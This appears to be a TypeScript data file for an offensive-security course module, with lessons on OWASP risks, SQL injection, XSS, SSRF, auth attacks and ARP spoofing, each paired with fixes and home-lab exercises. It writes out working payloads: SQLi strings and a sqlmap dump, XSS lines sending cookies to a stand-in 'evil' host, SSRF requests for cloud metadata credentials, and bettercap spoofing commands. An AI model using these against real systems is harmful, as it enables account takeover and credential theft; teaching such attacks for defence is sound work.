import type { Module } from "../curriculum";

export const module11: Module = {
  id: "module-11",
  slug: "11-network-web-attacks",
  title: "Network & Web Application Attacks",
  description:
    "The killer techniques against real targets: web top-10 risks, traffic interception, and server-side exploits.",
  language: "Offensive Security",
  lessons: [
    {
      id: 1,
      slug: "01-owasp-top10",
      title: "OWASP Top 10 Web Risks",
      level: "beginner",
      tag: "concept",
      duration: "40 min",
      description:
        "The 10 web vulnerabilities that matter most â€” what they are and how they happen.",
      content: `
# OWASP Top 10 Web Risks

## What OWASP Is

Open Worldwide Application Security Project. Every few years, security experts rank the most common & dangerous web app risks. It's the shared vocabulary of web security.

## The 10 (2021 Edition)

1. **Broken Access Control (A01)** â€” users CAN view/modify data they shouldn't (IDOR example below)
2. **Cryptographic Failures (A02)** â€” weak hashing, hardcoded keys, HTTP data at rest
3. **Injection (A03)** â€” SQL, XSS, LDAP, OS commands
4. **Insecure Design (A04)** â€” trusting client input by design (trust boundaries)
5. **Security Misconfiguration (A05)** â€” default passwords, debug on, verbose errors
6. **Vulnerable & Outdated Components (A06)** â€” a library with a known CVE exploited
7. **Identification & Authentication Failures (A07)** â€” weak passwords, session loopholes
8. **Software & Data Integrity Failures (A08)** â€” updates/CI pipeline compromised, deserialization
9. **Security Logging & Monitoring Failures (A09)** â€” breaches unnoticed for months (the OWASP "sorry" of 2025: many breaches go unseen)
10. **Server-Side Request Forgery (SSRF) (A10)** â€” server fetches attacker-controlled URLs (hit cloud metadata!)

## Read One Deep: IDOR (A01)

\`\`\`http
GET /api/orders/1001  â†’ your order
GET /api/orders/1002  â†’ SOMEONE ELSE's order?
\`\`\`

Insecure Direct Object Reference: the server trusts the object ID in the URL/number without checking ownership. Canonical bug, enormous blast radius.

**The fixed version:** always check authorization server-side before returning ANY resource. Never trust IDs from the client.

## Read Another Deep: Injection (A03)

SQL injection:

\`\`\`sql
-- the buggy query:
SELECT * FROM users WHERE name = '<USER_INPUT>'
-- input: ' OR '1'='1
SELECT * FROM users WHERE name = '' OR '1'='1'   -- ALL users!!
\`\`\`

Fix: **parameterized queries / prepared statements** â€” never concatenate user input into SQL.

## The Pattern Behind All 10

Ask of every feature: **is user input ever trusted to be honest?**

- IDOR â†’ trusting IDs in URLs (an object ID is user input)
- Injection â†’ trusting string content
- SSRF â†’ trusting URLs the server follows
- Access control â†’ trusting the cookie to mean "admin"

> Defense in depth is architecture, not luck. Read the OWASP docs on your own â€” every one of these has a "Prevention Cheat Sheet."
`,
      defaultCode: `-- BAD (injectable)
SELECT * FROM users WHERE name = '<user_input>';

-- GOOD (parameterized â€” prevents SQL injection)
-- In code: SELECT * FROM users WHERE name = $1;
--                with parameter user_input`,
  solution: `Prepared statements separate code from data forever â€” the fix for injection.`,
  hint: "Never concatenate input into queries or shell commands.",
  challenge: `**Home Lab â€” OWASP Walkthrough:**
1. Read the current OWASP Top Ten page.
2. For each of the 10: write 2 examples and the primary fix.
3. Relate them to common sites you use: where have you seen suspicious behavior?
4. (Skilled) Find a vulnerable practice app like DVWA (Damn Vulnerable Web Application) and demo A01/A03 in your lab.
5. Write reminders: "Check access control on resource + not just auth check" â€” post it at your desk.`,
    },
    {
      id: 2,
      slug: "02-sql-injection-xss",
      title: "SQL Injection & XSS Deep Dive",
      level: "advanced",
      tag: "lab",
      duration: "60 min",
      description: "Exploit and fix the two most classic web bugs: SQLi and stored/reflected XSS.",
      content: `
# SQL Injection & XSS Deep Dive

## SQL Injection â€” From "Test" to Full Control

**Detect:** a quote (\`)'\`) or \`1=1 --\` in an input field changes the page.

**Exploit chain:**
1. \`' OR '1'='1'\` â€” bypass login? (auth bypass)
2. \`' UNION SELECT 1,2,3--\` â€” find output columns (union)
3. Enumerate DB: \`SELECT table_name FROM information_schema.tables\`
4. Read secrets: \`SELECT password FROM users\`

**Blind (no visible output):** a database reacts differently to TRUE/FALSE â€” attacker infers character by character (\`SUBSTRING(password,1,1)='a'\`). SQLmap automates this:

\`\`\`bash
sqlmap -u "http://target?id=1" --dbs --dump
\`\`\`

**Fix:** parameterized queries; least-priv DB user; input validation as defense-in-depth (never validation as the ONLY barrier).

## XSS â€” Running JavaScript in Someone Else's Browser

**Reflected:** input reflects back immediately (search field). One victim at a time.
**Stored:** input stored and shown to every visitor (comments!). Persistent â€” mass effect.
**DOM:** payload runs via client-side JavaScript, nothing circulates to server.

**Impact:** steal session cookie â†’ hijack the session â†’ full account takeover:

\`\`\`html
<script>fetch('https://evil?c='+document.cookie)</script>
<img src=x onerror="document.location='https://evil/'+document.cookie">
\`\`\`

**Fix (defense in depth):**
1. Output **encoding/escaping** of context (HTML, attribute, JS)
2. **Content Security Policy (CSP)** â€” \`default-src 'self'\` blocks inline/external script
3. Set **HttpOnly** on cookies (JS can't read them â€” kills cookie-stealing)
4. Validate/sanitize input on server

> **Crown jewels both:** SQLi = !server PWN; XSS = client-side PWN. Your lab should produce *and* fix both.
`,
      defaultCode: `<!-- XSS test (lab app only) -->
<input value="<script>alert(1)</script>">
<!-- test if input is escaped ON OUTPUT: the browser prints it literally, or executes? -->
<h1><?php echo htmlspecialchars($userInput, ENT_QUOTES); ?></h1>
<!-- the fix: encode output. Same input now renders as harmless text -->`,
  solution: `The htmlspecialchars() call encodes output â€” script tags become harmless text. Output encoding is THE XSS fix.`,
  hint: "Find where input is echoed (reflected/stored) and check if it's escaped on OUTPUT, not just input-side.",
  challenge: `**Home Lab â€” Squeeze SQLi & XSS:**
1. Set up DVWA (or PortSwigger Web Security Academy labs, which are free).
2. Complete: SQLi (union-into-dump the users table) and stored XSS (post a script that writes a cookie-logger; read in another browser session).
3. Write the fix for BOTH: show the parameterized query + the output-encoding fix.
4. Test your fixes in the lab again: exploit now fails? Document "before/after".
5. Write your finding in a would-be pentest report format (title, severity, evidence, remediation).`,
    },
    {
      id: 3,
      slug: "03-ssrf-middleware-bypass",
      title: "SSRF, File Uploads & Auth Attacks",
      level: "advanced",
      tag: "lab",
      duration: "55 min",
      description: "Server-side request forgery, dangerous file uploads, and how authentication and sessions get beaten.",
      content: `
# SSRF, File Uploads & Auth Attacks

## SSRF â€” Making the Server Fetch for You

Server-side request forgery: the app fetches a URL **you** control. Why dangerous?

- Hit **internal** services (database management, Redis, admin UIs)
- Access cloud **metadata** endpoints (AWS: \`169.254.169.254\` gives you IAM keys!)

\`\`\`http
GET /preview?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/  â† AWS keys!!
GET /fetch?url=http://127.0.0.1:6379    â† internal Redis
GET /fetch?url=http://admin.internal:8080/    â† internal admin panel
\`\`\`

**Fix:**
1. Deny by default (allowlist of domains/protocols, never arbitrary)
2. No IP address literals; block loopback/link-local ranges (127.0.0.0/8, 169.254.169.254, 0.0.0.0/8...)
3. **DNS rebinding protections** â€” resolve & re-resolve the hostname; verify the final IP
4. Never proxy the metadata on

## Dangerous File Uploads

| Attack | Example | Defense |
|--------|---------|---------|
| Web shell | \`shell.php\` uploaded to a site where it's executed | Serve uploads from a non-executable location; whitelist extensions |
| Executable in images | polyglot GIF/PHP | Detect magic bytes; re-encode |
| XSS via SVG | \`<script>\` inside SVG | Restrict SVG; sanitize |
| Malware | user uploads a payload AV-worthy | Malware scan uploads |

**The fix list:** whitelist extensions+magic bytes, randomize filenames, store outside webroot, disable execution, scan.

## Authentication & Session Attacks

**Credential stuffing** â€” reused passwords from prior breaches, tried in bulk. Defense: MFA.

**Session fixation** â€” attacker sets your session ID, you log in, they're now logged in as you. Defense: regenerate session ID at login.

**Session hijacking** â€” steal a token (XSS steals cookies; network sniffing steals plaintext). Defense: HTTPS, HttpOnly, Secure, plus rotation.

**Password reset poisoning** â€” tricking the reset flow to send the token to an attacker-chosen email. Defense: token bound to the user's sessions/device.

**JWT abuse:**
- Algorithm confusion: \`alg:none\` (signature unchecked); RS256 vs HS256 confusion (public key as HMAC secret)
- Never trust \`alg\`; verify signature + issuer + exp + audience

> **The pattern again:** trust nothing from the client. Objects, URLs, files, cookies â€” all user input, all need validation + authorization server-side.
`,
      defaultCode: `// SSRF defense stub: allowlist approach
const BLOCKED = ["127.", "10.", "169.254.", "0."];
function safeUrl(u) {
  const h = new URL(u);
  const ip = h.hostname;
  if (BLOCKED.some(p => ip.startsWith(p))) return "BLOCKED: internal IP";
  return "OK: " + h.href;
}
console.log(safeUrl("http://169.254.169.254/latest/meta-data/")); // BLOCKED
console.log(safeUrl("http://example.com/health"));                // OK`,
  solution: `Denylist is good; allowlist (allow known domains only) is better. Block private ranges + link-local metadata IPs.`,
  hint: "169.254.169.254 is the danger IP â€” a metadata endpoint.",
  challenge: `**Home Lab â€” Your Own Server-Sided Attack Playground:**
1. In DVWA, complete the file-upload task: upload a PHP web shell to a non-executing dir to see the difference (lab only, revert after).
2. Practice SSRF detection: after your web app, add any URL-fetch feature to a cheap playground app and attempt 127.0.0.1 and 169.254.169.254 â€” what happens?
3. Fix both in your own app: uploads outside webroot + SSRF allowlist.
4. Test the fix (attack fails / block logs).
5. Write both as pentest findings with evidence & remediation.`,
    },
    {
      id: 4,
      slug: "04-network-attacks-arpspoof",
      title: "Network Attacks: ARP Spoofing & Traffic Interception",
      level: "advanced",
      tag: "lab",
      duration: "60 min",
      description: "MITM fundamentals: ARP spoofing, SSL stripping, and why encryption defeats the classics.",
      content: `
# Network Attacks: ARP Spoofing & Traffic Interception

## The LAN Is a Shared Medium

In a switch network, unicast only goes to one MAC â€” normally. But ARP (Address Resolution Protocol) has no authentication: any host can claim any IP.

## ARP Spoofing: The Classic MITM

1. Attacker sends ARP replies: "I am the gateway" (to the victim) and "I am the victim" (to the gateway)
2. Victim sends traffic to attacker â€” attacker relays to the gateway (acting as MITM)
3. Attacker reads EVERYTHING the victim sends

\`\`\`bash
# BetterCap / Ettercap â€” the standard tools
bettercap -iface eth0
# in the UI: net.probe on; set arp.spoof.targets 192.168.1.10; arp.spoof on
\`\`\`

**Why it works:** ARP has zero security. Fast, invisible, no wires needed.

## Defense Against ARP Spoofing

- **Dynamic ARP inspection** (switch feature) â€” bind IPâ†’MACâ†’port
- Static ARP entries
- Remember that **encryption makes MITM useless** â€” even if traffic is intercepted, it's unreadable.

## Sniffing & SSL Stripping â€” The Old Classic

Without TLS:
\`\`\`bash
# sniff traffic on the wire (switchport/same-hub or ARP-spoof)
tcpdump -i eth0 port 80 -A
# credentials in plaintext: you just read the login!
\`\`\`

**SSL stripping:** attacker intercepts, downgrades https:// to http:// at their position, relays TLS to the real site, and reads the plaintext in between. Mitigation: HSTS (\`Strict-Transport-Security\`) forces browsers to https â€” kills the strip.

## HSTS: The Tool That Killed SSL Stripping

\`\`\`http
Strict-Transport-Security: max-age=31536000; includeSubDomains
\`\`\`

Once seen, the browser refuses ALL http â€” the strip can't happen. Preload lists extend it globally.

## DNS & Other Bugs

- **DNS cache poisoning** â€” fake replies redirect names (fix: DNSSEC)
- **Rogue DHCP** â€” give out yourself as gateway/DNS (fix: DHCP snooping)
- **MAC flooding** â€” flood to fill the switch CAM table â†’ acts like a hub (fix: switch port security)

## The Big Lesson

The intercept is easy. The **value** comes from what's readable:
- Plaintext protocols \`telnet\`, \`http\`, \`FTP\` â†’ complete compromise
- Encrypted \`https\`, \`ssh\` â†’ the MITM is defeated (unless stripped)

> **Defender action plan worldwide:** encrypt everything (HTTPS/HSTS, SSH), and add MITM-resistant layers (wire encryption, network segmentation, dynamic ARP inspection). The attack's premise disappears.
`,
      defaultCode: `#!/bin/bash
# Educational: verify YOUR OWN host's ARP table sanity
echo "== ARP table (gateway MAC should be stable across refreshes) =="
ip neigh show | head
echo "== HSTS test: request your test site and see the header =="
curl -sI https://example.com | grep -i strict-transport || echo "no HSTS header â€” downgrade risk"`,
  solution: `Shows the ARP table (gateway fingerprint) and HSTS presence â€” simple checks of two MITM defenses.`,
  hint: "A changing gateway MAC across refreshes = ARP spoofing red flag.",
  challenge: `**Home Lab â€” MITM Understand, Then Fix:**
1. In your PROPERLY ISOLATED lab (NAT'd network, private range, reverting VMs): ARP-spoof a victim VM with Bettercap or Arpspoof.
2. Intercept a plaintext HTTP login (tcpdump shows it in clear).
3. Now turn on https + HSTS; try to strip it â€” does the downgrade fail?
4. On the switch/virtual switch: enable DAI/DHCP snooping in the lab config (if possible) â€” retry the spoof; does it get dropped?
5. Write "the MITM defense matrix" for a small office: LAN controls, encryption, host hardening.
6. Revert all lab machines.`,
    },
  ],
};